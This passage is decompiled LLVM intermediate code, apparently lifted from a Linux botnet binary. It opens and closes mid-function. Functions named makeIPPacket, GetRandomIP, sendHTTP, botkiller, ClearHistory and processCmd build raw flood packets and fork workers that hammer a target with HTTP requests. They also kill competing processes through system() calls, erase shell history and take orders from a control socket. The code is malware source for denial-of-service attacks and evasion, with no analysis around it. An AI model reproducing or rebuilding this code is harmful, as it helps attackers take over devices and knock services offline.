  store i32 %v0_804e4a0, i32* %v3_804e4a0, align 4
  %v1_804e4a1 = load i32, i32* %stack_var_-64, align 4
  %v2_804e4a1 = inttoptr i32 %stack_var_-68.0 to i16*
  %v3_804e4a1 = call i32 @csum(i16* %v2_804e4a1, i32 %v1_804e4a1)
  %v4_804e4a1 = trunc i32 %v3_804e4a1 to i16
  %sext18 = mul i32 %v3_804e4a1, 65536
  %v1_804e4a9 = sdiv i32 %sext18, 65536
  store i32 %v1_804e4a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804e08b, i32* %eax.global-to-local, align 4
  store i16 %v4_804e4a1, i16* %v4_804e3e3, align 2
  store i32 %arg7, i32* @edi, align 4
  %v10_804e4b5 = icmp ult i32 %stack_var_-68.0, %arg7
  store i1 %v10_804e4b5, i1* %cf.global-to-local, align 1
  %v15_804e4b5 = icmp eq i32 %stack_var_-68.0, %arg7
  %v1_804e4b8 = icmp eq i1 %v15_804e4b5, false
  br i1 %v1_804e4b8, label %dec_label_pc_804e4d8, label %dec_label_pc_804e4ba

dec_label_pc_804e4ba:                             ; preds = %dec_label_pc_804e403
  %v0_804e4ba = load i32, i32* @esp, align 4
  %v5_804e4ba = icmp ult i32 %v0_804e4ba, 12
  store i1 %v5_804e4ba, i1* %cf.global-to-local, align 1
  %v1_804e4bd = add i32 %v0_804e4ba, -16
  %v2_804e4bd = inttoptr i32 %v1_804e4bd to i32*
  store i32 0, i32* %v2_804e4bd, align 4
  %v1_804e4bf = inttoptr i32 %stack_var_-68.0 to i32*
  %v2_804e4bf = call i32 @__GI_time(i32* %v1_804e4bf)
  store i32 %v2_804e4bf, i32* %eax.global-to-local, align 4
  %v0_804e4c4 = load i32, i32* @esp, align 4
  %v1_804e4c4 = add i32 %v0_804e4c4, 16
  %v10_804e4c7 = icmp ult i32 %v2_804e4bf, %v5_804e3f4
  store i1 %v10_804e4c7, i1* %cf.global-to-local, align 1
  %v8_804e4ca = icmp sgt i32 %v2_804e4bf, %v5_804e3f4
  br i1 %v8_804e4ca, label %dec_label_pc_804e4e0, label %dec_label_pc_804e403

dec_label_pc_804e4d8:                             ; preds = %dec_label_pc_804e403
  %v4_804e4d8 = add i32 %stack_var_-68.0, 1
  %v0_804e409.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e403

dec_label_pc_804e4e0:                             ; preds = %dec_label_pc_804e4ba, %dec_label_pc_804df9f, %dec_label_pc_804e028, %dec_label_pc_804dfea
  %v0_804e4ea = phi i32 [ %v4_804dfac, %dec_label_pc_804df9f ], [ %v3_804e036, %dec_label_pc_804e028 ], [ %v3_804dff8, %dec_label_pc_804dfea ], [ %v2_804e4bf, %dec_label_pc_804e4ba ]
  store i32 %v0_804df5e, i32* @ebx, align 4
  store i32 %v0_804df5d, i32* @esi, align 4
  ret i32 %v0_804e4ea

; uselistorder directives
  uselistorder i32 %v2_804e4bf, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804e462, { 1, 0 }
  uselistorder i32 %v1_804e447, { 1, 0 }
  uselistorder i32 %v0_804e432, { 1, 0 }
  uselistorder i32 %stack_var_-68.0, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %v0_804e409, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v5_804e3f4, { 1, 0, 2, 3 }
  uselistorder i32 %v3_804e3ec, { 1, 0 }
  uselistorder i32 %v1_804e3d6, { 1, 0 }
  uselistorder i32 %v1_804e388, { 1, 0 }
  uselistorder i32 %v1_804e359, { 1, 0 }
  uselistorder i32 %v3_804e33f, { 2, 1, 0, 3 }
  uselistorder i8* %stack_var_-156.0, { 1, 0 }
  uselistorder i32 %stack_var_-160.0, { 1, 0 }
  uselistorder i32 %v1_804e314, { 1, 0 }
  uselistorder i1 %v0_804e2fb, { 1, 0 }
  uselistorder i32 %v6_804e2f9, { 1, 0 }
  uselistorder i32 %v1_804e2c1, { 1, 0 }
  uselistorder i1 %v0_804e2a8, { 1, 0 }
  uselistorder i32 %v6_804e2a6, { 1, 0 }
  uselistorder i32 %v1_804e26b, { 1, 0 }
  uselistorder i1 %v0_804e252, { 1, 0 }
  uselistorder i32 %v6_804e250, { 1, 0 }
  uselistorder i32 %v1_804e221, { 1, 0 }
  uselistorder i1 %v0_804e208, { 1, 0 }
  uselistorder i32 %v6_804e206, { 1, 0 }
  uselistorder i32 %v1_804e1dd, { 1, 0 }
  uselistorder i1 %v0_804e1c4, { 1, 0 }
  uselistorder i32 %v6_804e1c2, { 1, 0 }
  uselistorder i32 %v4_804e1a4, { 0, 2, 1, 4, 3, 6, 5, 8, 7, 9, 10 }
  uselistorder i32 %stack_var_-160.129, { 3, 2, 1, 0 }
  uselistorder i8* %stack_var_-156.130, { 3, 2, 1, 0 }
  uselistorder i8* %v3_804e324, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8* %v2_804e311, { 4, 9, 3, 8, 2, 7, 1, 6, 0, 5 }
  uselistorder i32 %v1_804e17d, { 1, 0 }
  uselistorder i32 %v1_804e171, { 1, 0 }
  uselistorder i32 %v1_804e165, { 1, 0 }
  uselistorder i32 %v1_804e159, { 1, 0 }
  uselistorder i32 %v1_804e14d, { 1, 0 }
  uselistorder i8* %v2_804e14a, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i1 %v0_804e134, { 1, 0 }
  uselistorder i32 %v6_804e132, { 1, 0 }
  uselistorder i32 %v1_804e0e6, { 1, 0 }
  uselistorder i32 %v0_804e0c8, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v1_804e0a3, { 5, 6, 7, 8, 9, 10, 0, 1, 2, 3, 4, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 %v2_804e08b, { 14, 13, 12, 11, 10, 9, 8, 26, 25, 24, 7, 6, 23, 5, 4, 22, 21, 20, 19, 27, 18, 17, 16, 15, 3, 2, 1, 0 }
  uselistorder i32 %v2_804e080, { 1, 0, 2 }
  uselistorder i32 %v2_804e061, { 1, 0 }
  uselistorder i32 %v1_804df8a, { 1, 0 }
  uselistorder i32* %stack_var_-172, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-60, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-56, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-64, { 1, 2, 0, 4, 3 }
  uselistorder i8** %stack_var_-20, { 3, 1, 2, 0 }
  uselistorder i32* %edx.global-to-local, { 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32* %eax.global-to-local, { 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52 }
  uselistorder i1* %cf.global-to-local, { 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 0, 1, 2, 3, 21, 4, 5, 6, 7, 8, 10, 9, 11, 13, 12, 14, 16, 15, 17, 19, 18, 20, 64, 65, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 0, 2, 1 }
  uselistorder i32 -24, { 0, 1, 5, 4, 3, 2, 6, 7, 8, 9 }
  uselistorder i32 -20, { 0, 1, 5, 4, 3, 2, 6, 7, 8, 9 }
  uselistorder i32 (i16*, i32)* @csum, { 3, 4, 0, 1, 2 }
  uselistorder i32 ()* @makeIPPacket, { 1, 0 }
  uselistorder i32 ()* @htonl, { 0, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @GetRandomIP, { 0, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 (i32)* @rand_cmwc, { 3, 2, 1, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 0 }
  uselistorder i32 %arg7, { 0, 2, 1, 3 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i8* %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e4e0, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804e403, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e39d, { 1, 0 }
  uselistorder label %dec_label_pc_804e335, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_804e1a4, { 1, 0 }
  uselistorder label %dec_label_pc_804e068, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %dec_label_pc_804df9f, { 1, 0 }
}

define i32 @botkiller() local_unnamed_addr {
entry:
  %stack_var_-88 = alloca i32, align 4
  %v2_804e4fd = ptrtoint i32* %stack_var_-88 to i32
  %v2_804e525 = bitcast i32* %stack_var_-88 to i8*
  br label %dec_label_pc_804e4f1

dec_label_pc_804e4f1:                             ; preds = %dec_label_pc_804e5a0, %entry
  br label %dec_label_pc_804e4fd

dec_label_pc_804e4fd:                             ; preds = %dec_label_pc_804e4f1, %dec_label_pc_804e4fd
  %storemerge117 = phi i32 [ 0, %dec_label_pc_804e4f1 ], [ %v4_804e593, %dec_label_pc_804e4fd ]
  store i32 1818848112, i32* %stack_var_-88, align 4
  %v1_804e516 = mul nuw nsw i32 %storemerge117, 4
  %v2_804e516 = add i32 %v1_804e516, ptrtoint ([87 x i8*]* @global_var_805b040.393 to i32)
  %v3_804e516 = inttoptr i32 %v2_804e516 to i32*
  %v4_804e516 = load i32, i32* %v3_804e516, align 4
  %v3_804e525 = call i32 @strcat(i8* %v2_804e525, i32 %v4_804e516)
  %v1_804e534 = call i32 @__libc_system(i32 %v2_804e4fd)
  store i32 1818848112, i32* %stack_var_-88, align 4
  %v4_804e559 = load i32, i32* %v3_804e516, align 4
  %v3_804e568 = call i32 @strcat(i8* %v2_804e525, i32 %v4_804e559)
  %v3_804e57c = call i32 @strcat(i8* %v2_804e525, i32 ptrtoint (i32* @global_var_8058799.394 to i32))
  %v1_804e58b = call i32 @__libc_system(i32 %v2_804e4fd)
  %v4_804e593 = add nuw nsw i32 %storemerge117, 1
  %exitcond = icmp eq i32 %v4_804e593, 9
  br i1 %exitcond, label %dec_label_pc_804e5a0, label %dec_label_pc_804e4fd

dec_label_pc_804e5a0:                             ; preds = %dec_label_pc_804e4fd
  %v1_804e5a5 = call i32 @sleep(i32 5)
  br label %dec_label_pc_804e4f1

; uselistorder directives
  uselistorder i32 %storemerge117, { 1, 0 }
  uselistorder i32* %stack_var_-88, { 1, 2, 0, 3 }
  uselistorder [3 x i8]* @global_var_805731b.15, { 1, 0 }
  uselistorder label %dec_label_pc_804e4fd, { 1, 0 }
}

define i32 @ClearHistory() local_unnamed_addr {
entry:
  %v2_804e5c0 = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_805879b.395 to i32))
  %v2_804e5d0 = call i32 @__libc_system(i32 ptrtoint ([30 x i8]* @global_var_80587b1.396 to i32))
  %v2_804e5e0 = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_80587cf.397 to i32))
  ret i32 %v2_804e5e0

; uselistorder directives
  uselistorder i32 (i32)* @__libc_system, { 4, 3, 2, 1, 0 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-580 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e5ee = load i32, i32* @esi, align 4
  %v0_804e5ef = load i32, i32* @ebx, align 4
  store i32 %v0_804e5ef, i32* %stack_var_-16, align 4
  %v2_804e600 = ptrtoint i32* %stack_var_-56 to i32
  %tmp36 = bitcast i32* %stack_var_-56 to i8*
  store i32 %v2_804e600, i32* @edi, align 4
  store i32 ptrtoint ([7 x i8*]* @global_var_80589bc.405 to i32), i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_804e610 = call i8* @_memcpy(i8* %tmp36, i8* bitcast ([7 x i8*]* @global_var_80589bc.405 to i8*), i32 7)
  %v2_804e62c = call i32 @__GI_time(i32* null)
  %v5_804e634 = add i32 %v2_804e62c, %arg5
  store i32 %v5_804e634, i32* @eax, align 4
  %v1_804e63a = call i32 @random()
  %v2_804e64a = ashr i32 %v1_804e63a, 31
  %v2_804e64d = zext i32 %v1_804e63a to i64
  %v4_804e64d = zext i32 %v2_804e64a to i64
  %v5_804e64d = mul nuw i64 %v4_804e64d, 4294967296
  %v6_804e64d = or i64 %v5_804e64d, %v2_804e64d
  %v10_804e64d = srem i64 %v6_804e64d, 7
  %v11_804e64d = trunc i64 %v10_804e64d to i32
  store i32 %v11_804e64d, i32* @eax, align 4
  %v0_804e651 = load i32, i32* @ebp, align 4
  %v2_804e651 = mul i32 %v11_804e64d, 4
  %v3_804e651 = add i32 %v0_804e651, -52
  %v4_804e651 = add i32 %v3_804e651, %v2_804e651
  %v5_804e651 = inttoptr i32 %v4_804e651 to i32*
  %v6_804e651 = load i32, i32* %v5_804e651, align 4
  store i32 %v6_804e651, i32* @ebx, align 4
  %v0_804e655 = call i32 @random()
  store i32 3, i32* @edi, align 4
  %v2_804e680 = ptrtoint i32* %stack_var_-580 to i32
  %v5_804e687 = call i32 @sprintf(i32 %v2_804e680, i32 ptrtoint ([62 x i8]* @global_var_80589f0.409 to i32), i32 %arg2, i32 %arg4)
  %v5_804e73846 = icmp sgt i32 %arg6, 0
  br i1 %v5_804e73846, label %dec_label_pc_804e69b, label %dec_label_pc_804e73e

dec_label_pc_804e69b:                             ; preds = %entry, %dec_label_pc_804e72f
  %storemerge47 = phi i32 [ %v4_804e72f, %dec_label_pc_804e72f ], [ 0, %entry ]
  %v1_804e69b = call i32 @__libc_fork(i32 %storemerge47)
  %v1_804e6a0 = icmp eq i32 %v1_804e69b, 0
  br i1 %v1_804e6a0, label %dec_label_pc_804e72f, label %dec_label_pc_804e713.preheader

dec_label_pc_804e713.preheader:                   ; preds = %dec_label_pc_804e69b
  %v4_804e6e2 = bitcast i32* %stack_var_-580 to i8*
  %v2_804e71840 = call i32 @__GI_time(i32* null)
  %v5_804e72343 = icmp slt i32 %v2_804e71840, %v5_804e634
  br i1 %v5_804e72343, label %dec_label_pc_804e6aa.lr.ph, label %dec_label_pc_804e725

dec_label_pc_804e6aa.lr.ph:                       ; preds = %dec_label_pc_804e713.preheader
  br label %dec_label_pc_804e6aa

dec_label_pc_804e6aa:                             ; preds = %dec_label_pc_804e6aa.lr.ph, %dec_label_pc_804e713.backedge
  store i32 %arg1, i32* @edx, align 4
  %v3_804e6bd = call i32 @socket_connect(i32 %arg1, i16 %arg3)
  %v4_804e6c8 = icmp eq i32 %v3_804e6bd, 0
  br i1 %v4_804e6c8, label %dec_label_pc_804e713.backedge, label %dec_label_pc_804e6ce

dec_label_pc_804e6ce:                             ; preds = %dec_label_pc_804e6aa
  store i1 false, i1* @df, align 1
  store i32 %v2_804e680, i32* @edi, align 4
  %v3_804e6e8 = call i32 @_strlen(i8* %v4_804e6e2)
  %v4_804e6fd = call i32 @__libc_write(i32 %v3_804e6bd, i32* nonnull %stack_var_-580, i32 %v3_804e6e8)
  %v1_804e70b = call i32 @__libc_close(i32 %v3_804e6bd)
  br label %dec_label_pc_804e713.backedge

dec_label_pc_804e713.backedge:                    ; preds = %dec_label_pc_804e6ce, %dec_label_pc_804e6aa
  %v2_804e718 = call i32 @__GI_time(i32* null)
  %v5_804e723 = icmp slt i32 %v2_804e718, %v5_804e634
  br i1 %v5_804e723, label %dec_label_pc_804e6aa, label %dec_label_pc_804e725

dec_label_pc_804e725:                             ; preds = %dec_label_pc_804e713.backedge, %dec_label_pc_804e713.preheader
  %v1_804e72a = call i32 @__GI__exit(i32 1)
  unreachable

dec_label_pc_804e72f:                             ; preds = %dec_label_pc_804e69b
  %v4_804e72f = add nuw nsw i32 %storemerge47, 1
  %v5_804e738 = icmp slt i32 %v4_804e72f, %arg6
  br i1 %v5_804e738, label %dec_label_pc_804e69b, label %dec_label_pc_804e73e

dec_label_pc_804e73e:                             ; preds = %dec_label_pc_804e72f, %entry
  %storemerge.lcssa = phi i32 [ 0, %entry ], [ %v4_804e72f, %dec_label_pc_804e72f ]
  %v2_804e741 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804e741, i32* @ebx, align 4
  store i32 %v0_804e5ee, i32* @esi, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_804e72f, { 0, 2, 1 }
  uselistorder i32 %storemerge47, { 1, 0 }
  uselistorder i32 %v5_804e634, { 1, 0, 2 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder label %dec_label_pc_804e6aa, { 1, 0 }
  uselistorder label %dec_label_pc_804e69b, { 1, 0 }
}

define i32 @processCmd() local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %tmp134 = call i32 @__decompiler_undefined_function_0()
  %tmp162 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e749 = load i32, i32* @edi, align 4
  %v0_804e74a = load i32, i32* @esi, align 4
  %v0_804e74b = load i32, i32* @ebx, align 4
  store i32 %v0_804e74b, i32* %stack_var_-16, align 4
  %v5_804e74c = icmp ult i32* %stack_var_-16, inttoptr (i32 316 to i32*)
  store i1 %v5_804e74c, i1* %cf.global-to-local, align 1
  %v15_804e74c = ptrtoint i32* %stack_var_-332 to i32
  %v1_804e755 = inttoptr i32 %tmp162 to i32*
  %v2_804e755 = load i32, i32* %v1_804e755, align 4
  store i1 false, i1* @df, align 1
  %v4_804e772 = inttoptr i32 %v2_804e755 to i8*
  store i32 %v2_804e755, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8057a97.21 to i32), i32* @edi, align 4
  %v7_804e784 = call i32 @_strncmp(i8* %v4_804e772, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057a97.21, i32 0, i32 0), i32 5)
  %v8_804e784 = urem i32 %v7_804e784, 2
  %v9_804e784 = icmp eq i32 %v8_804e784, 0
  %v0_804e786 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e786 = or i1 %v0_804e786, %v9_804e784
  %v3_804e786 = zext i1 %v2_804e786 to i32
  %v4_804e786 = load i32, i32* @edx, align 4
  %v5_804e786 = and i32 %v4_804e786, -256
  %v6_804e786 = or i32 %v3_804e786, %v5_804e786
  %v7_804e786 = xor i32 %v6_804e786, 1
  store i32 %v7_804e786, i32* %edx.global-to-local, align 4
  %v1_804e78e = trunc i32 %v7_804e786 to i8
  %v3_804e78e = zext i1 %v0_804e786 to i8
  %v15_804e78e = icmp eq i8 %v1_804e78e, %v3_804e78e
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e797 = icmp eq i1 %v15_804e78e, false
  br i1 %v1_804e797, label %dec_label_pc_804e7b4, label %dec_label_pc_804e799

dec_label_pc_804e799:                             ; preds = %entry
  %v0_804e799 = load i32, i32* @global_var_805b540.20, align 64
  %v0_804e79e = load i32, i32* @esp, align 4
  %v5_804e79e = icmp ult i32 %v0_804e79e, 8
  store i1 %v5_804e79e, i1* %cf.global-to-local, align 1
  store i32 %v0_804e799, i32* %stack_var_-348, align 4
  %v2_804e7a7 = call i32 @sockprintf(i32 %v0_804e799, i32 ptrtoint ([6 x i8]* @global_var_8058a2e.410 to i32))
  %v0_804e7ac = load i32, i32* @esp, align 4
  %v2_804e7ac = icmp ugt i32 %v0_804e7ac, -17
  store i1 %v2_804e7ac, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f52b

dec_label_pc_804e7b4:                             ; preds = %entry
  %v2_804e7b7 = load i32, i32* %v1_804e755, align 4
  store i1 false, i1* @df, align 1
  %v4_804e7d4 = inttoptr i32 %v2_804e7b7 to i8*
  store i32 %v2_804e7b7, i32* @esi, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_8058a34.411 to i32), i32* @edi, align 4
  %v7_804e7e6 = call i32 @_strncmp(i8* %v4_804e7d4, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8058a34.411, i32 0, i32 0), i32 6)
  %v8_804e7e6 = urem i32 %v7_804e7e6, 2
  %v9_804e7e6 = icmp eq i32 %v8_804e7e6, 0
  %v0_804e7e8 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e7e8 = or i1 %v0_804e7e8, %v9_804e7e6
  %v3_804e7e8 = zext i1 %v2_804e7e8 to i32
  %v4_804e7e8 = load i32, i32* %edx.global-to-local, align 4
  %v5_804e7e8 = and i32 %v4_804e7e8, -256
  %v6_804e7e8 = or i32 %v3_804e7e8, %v5_804e7e8
  %v7_804e7e8 = xor i32 %v6_804e7e8, 1
  store i32 %v7_804e7e8, i32* %edx.global-to-local, align 4
  %v1_804e7f0 = trunc i32 %v7_804e7e8 to i8
  %v3_804e7f0 = zext i1 %v0_804e7e8 to i8
  %v15_804e7f0 = icmp eq i8 %v1_804e7f0, %v3_804e7f0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e7f9 = icmp eq i1 %v15_804e7f0, false
  br i1 %v1_804e7f9, label %dec_label_pc_804e81d, label %dec_label_pc_804e7fb

dec_label_pc_804e7fb:                             ; preds = %dec_label_pc_804e7b4
  %v0_804e7fb = call i32 @getdtablesize()
  %v0_804e800 = load i32, i32* @global_var_805b540.20, align 64
  store i32 %v0_804e800, i32* %edx.global-to-local, align 4
  %v0_804e806 = load i32, i32* @esp, align 4
  %v5_804e806 = icmp ult i32 %v0_804e806, 4
  store i1 %v5_804e806, i1* %cf.global-to-local, align 1
  store i32 %v0_804e800, i32* %stack_var_-348, align 4
  %v2_804e810 = call i32 @sockprintf(i32 %v0_804e800, i32 ptrtoint ([3 x i8]* @global_var_8058a3a.412 to i32))
  %v0_804e815 = load i32, i32* @esp, align 4
  %v2_804e815 = icmp ugt i32 %v0_804e815, -17
  store i1 %v2_804e815, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f52b

dec_label_pc_804e81d:                             ; preds = %dec_label_pc_804e7b4
  %v2_804e820 = load i32, i32* %v1_804e755, align 4
  %v4_804e83d = inttoptr i32 %v2_804e820 to i8*
  %v7_804e84f = call i32 @_strncmp(i8* %v4_804e83d, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8058a3d.413, i32 0, i32 0), i32 8)
  %v8_804e84f = urem i32 %v7_804e84f, 2
  %v9_804e84f = icmp eq i32 %v8_804e84f, 0
  %v0_804e851 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e851 = or i1 %v0_804e851, %v9_804e84f
  %v3_804e851 = zext i1 %v2_804e851 to i32
  %v4_804e851 = load i32, i32* %edx.global-to-local, align 4
  %v5_804e851 = and i32 %v4_804e851, -256
  %v6_804e851 = or i32 %v3_804e851, %v5_804e851
  %v7_804e851 = xor i32 %v6_804e851, 1
  store i32 %v7_804e851, i32* %edx.global-to-local, align 4
  %v1_804e859 = trunc i32 %v7_804e851 to i8
  %v3_804e859 = zext i1 %v0_804e851 to i8
  %v15_804e859 = icmp eq i8 %v1_804e859, %v3_804e859
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e862 = icmp eq i1 %v15_804e859, false
  br i1 %v1_804e862, label %dec_label_pc_804e9c4, label %dec_label_pc_804e868

dec_label_pc_804e868:                             ; preds = %dec_label_pc_804e81d
  %v1_804e86b = add i32 %tmp162, 4
  %v5_804e86b = icmp ugt i32 %tmp162, -5
  store i1 %v5_804e86b, i1* %cf.global-to-local, align 1
  %v1_804e86e = inttoptr i32 %v1_804e86b to i32*
  %v2_804e86e = load i32, i32* %v1_804e86e, align 4
  store i1 false, i1* @df, align 1
  %v4_804e88b = inttoptr i32 %v2_804e86e to i8*
  store i32 %v2_804e86e, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8058a45.414 to i32), i32* @edi, align 4
  %v7_804e89d = call i32 @_strncmp(i8* %v4_804e88b, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8058a45.414, i32 0, i32 0), i32 4)
  %v8_804e89d = urem i32 %v7_804e89d, 2
  %v9_804e89d = icmp eq i32 %v8_804e89d, 0
  %v0_804e89f = load i1, i1* %cf.global-to-local, align 1
  %v2_804e89f = or i1 %v0_804e89f, %v9_804e89d
  %v3_804e89f = zext i1 %v2_804e89f to i32
  %v4_804e89f = load i32, i32* %edx.global-to-local, align 4
  %v5_804e89f = and i32 %v4_804e89f, -256
  %v6_804e89f = or i32 %v3_804e89f, %v5_804e89f
  %v7_804e89f = xor i32 %v6_804e89f, 1
  store i32 %v7_804e89f, i32* @edx, align 4
  %v1_804e8a7 = trunc i32 %v7_804e89f to i8
  %v3_804e8a7 = zext i1 %v0_804e89f to i8
  %v15_804e8a7 = icmp eq i8 %v1_804e8a7, %v3_804e8a7
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e8b0 = icmp eq i1 %v15_804e8a7, false
  br i1 %v1_804e8b0, label %dec_label_pc_804e8f2, label %dec_label_pc_804e8b2

dec_label_pc_804e8b2:                             ; preds = %dec_label_pc_804e868
  %v0_804e8b2 = load i32, i32* @global_var_80617d0.415, align 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e8b7 = icmp eq i32 %v0_804e8b2, 0
  br i1 %v1_804e8b7, label %dec_label_pc_804f52b, label %dec_label_pc_804e8bf

dec_label_pc_804e8bf:                             ; preds = %dec_label_pc_804e8b2
  %v0_804e8c4 = load i32, i32* @esp, align 4
  %v5_804e8c4 = icmp ult i32 %v0_804e8c4, 8
  store i1 %v5_804e8c4, i1* %cf.global-to-local, align 1
  store i32 %v0_804e8b2, i32* %stack_var_-348, align 4
  %v2_804e8ca = call i32 @kill(i32 %v0_804e8b2, i32 9)
  %v0_804e8d2 = load i32, i32* @global_var_805b540.20, align 64
  %v5_804e8d7 = icmp ult i32* %stack_var_-332, inttoptr (i32 8 to i32*)
  store i1 %v5_804e8d7, i1* %cf.global-to-local, align 1
  store i32 %v0_804e8d2, i32* %stack_var_-348, align 4
  %v2_804e8e0 = call i32 @sockprintf(i32 %v0_804e8d2, i32 ptrtoint ([17 x i8]* @global_var_8058a49.416 to i32))
  %v0_804e8e5 = load i32, i32* @esp, align 4
  %v2_804e8e5 = icmp ugt i32 %v0_804e8e5, -17
  store i1 %v2_804e8e5, i1* %cf.global-to-local, align 1
  store i32 0, i32* @global_var_80617d0.415, align 16
  br label %dec_label_pc_804e8f2

dec_label_pc_804e8f2:                             ; preds = %dec_label_pc_804e868, %dec_label_pc_804e8bf
  store i1 %v5_804e86b, i1* %cf.global-to-local, align 1
  %v2_804e8f8 = load i32, i32* %v1_804e86e, align 4
  store i1 false, i1* @df, align 1
  %v4_804e915 = inttoptr i32 %v2_804e8f8 to i8*
  store i32 %v2_804e8f8, i32* @esi, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8058a5a.417 to i32), i32* @edi, align 4
  %v7_804e927 = call i32 @_strncmp(i8* %v4_804e915, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8058a5a.417, i32 0, i32 0), i32 3)
  %v8_804e927 = urem i32 %v7_804e927, 2
  %v9_804e927 = icmp eq i32 %v8_804e927, 0
  %v0_804e929 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e929 = or i1 %v0_804e929, %v9_804e927
  %v3_804e929 = zext i1 %v2_804e929 to i32
  %v4_804e929 = load i32, i32* @edx, align 4
  %v5_804e929 = and i32 %v4_804e929, -256
  %v6_804e929 = or i32 %v3_804e929, %v5_804e929
  %v7_804e929 = xor i32 %v6_804e929, 1
  store i32 %v7_804e929, i32* %edx.global-to-local, align 4
  %v1_804e931 = trunc i32 %v7_804e929 to i8
  %v3_804e931 = zext i1 %v0_804e929 to i8
  %v15_804e931 = icmp eq i8 %v1_804e931, %v3_804e931
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e93a = icmp eq i1 %v15_804e931, false
  br i1 %v1_804e93a, label %dec_label_pc_804e9c4, label %dec_label_pc_804e940

dec_label_pc_804e940:                             ; preds = %dec_label_pc_804e8f2
  %v0_804e940 = load i32, i32* @global_var_80617d0.415, align 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e945 = icmp eq i32 %v0_804e940, 0
  %v1_804e947 = icmp eq i1 %v1_804e945, false
  br i1 %v1_804e947, label %dec_label_pc_804f52b, label %dec_label_pc_804e94d

dec_label_pc_804e94d:                             ; preds = %dec_label_pc_804e940
  %v1_804e94d = call i32 @__libc_fork(i32 3)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804e963 = icmp eq i32 %v1_804e94d, 0
  br i1 %v4_804e963, label %dec_label_pc_804e980, label %dec_label_pc_804e969

dec_label_pc_804e969:                             ; preds = %dec_label_pc_804e94d
  store i32 %v1_804e94d, i32* @global_var_80617d0.415, align 16
  br label %dec_label_pc_804f52b

dec_label_pc_804e980:                             ; preds = %dec_label_pc_804e94d
  %v0_804e980 = load i32, i32* @esp, align 4
  %v5_804e980 = icmp ult i32 %v0_804e980, 12
